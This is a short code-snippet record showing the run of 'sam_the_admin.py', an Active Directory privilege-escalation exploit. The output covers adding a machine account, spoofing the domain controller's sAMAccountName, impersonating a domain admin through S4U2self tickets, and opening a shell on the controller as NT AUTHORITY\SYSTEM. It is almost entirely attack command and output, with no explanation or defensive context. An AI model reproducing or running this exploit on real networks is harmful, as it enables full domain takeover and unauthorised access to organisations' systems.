---
id: eb31f3ee-d651-4538-899f-935a6ef1f9f9
type: code
language: ps1
verified: false
created_at: '2023-04-06T03:56:03.186071+00:00'
updated_at: '2023-04-10T20:36:11.700422+00:00'
---

# Code Snippet eb31f3ee

**Language**: ps1

```ps1
$ python3 sam_the_admin.py "domain/user:password" -dc-ip 10.10.10.10 -shell
[*] Selected Target dc.caltech.white                                              
[*] Total Domain Admins 11                                                        
[*] will try to impersonat gaylene.dreddy                                         
[*] Current ms-DS-MachineAccountQuota = 10                                        
[*] Adding Computer Account "SAMTHEADMIN-11$"                                     
[*] MachineAccount "SAMTHEADMIN-11$" password = EhFMT%mzmACL                      
[*] Successfully added machine account SAMTHEADMIN-11$ with password EhFMT%mzmACL.
[*] SAMTHEADMIN-11$ object = CN=SAMTHEADMIN-11,CN=Computers,DC=caltech,DC=white   
[*] SAMTHEADMIN-11$ sAMAccountName == dc                                          
[*] Saving ticket in dc.ccache                                                    
[*] Resting the machine account to SAMTHEADMIN-11$                                
[*] Restored SAMTHEADMIN-11$ sAMAccountName to original value                     
[*] Using TGT from cache                                                          
[*] Impersonating gaylene.dreddy                                                  
[*]     Requesting S4U2self                                                       
[*] Saving ticket in gaylene.dreddy.ccache                                        
[!] Launching semi-interactive shell - Careful what you execute                   
C:\Windows\system32>whoami                                                        
nt authority\system 
```
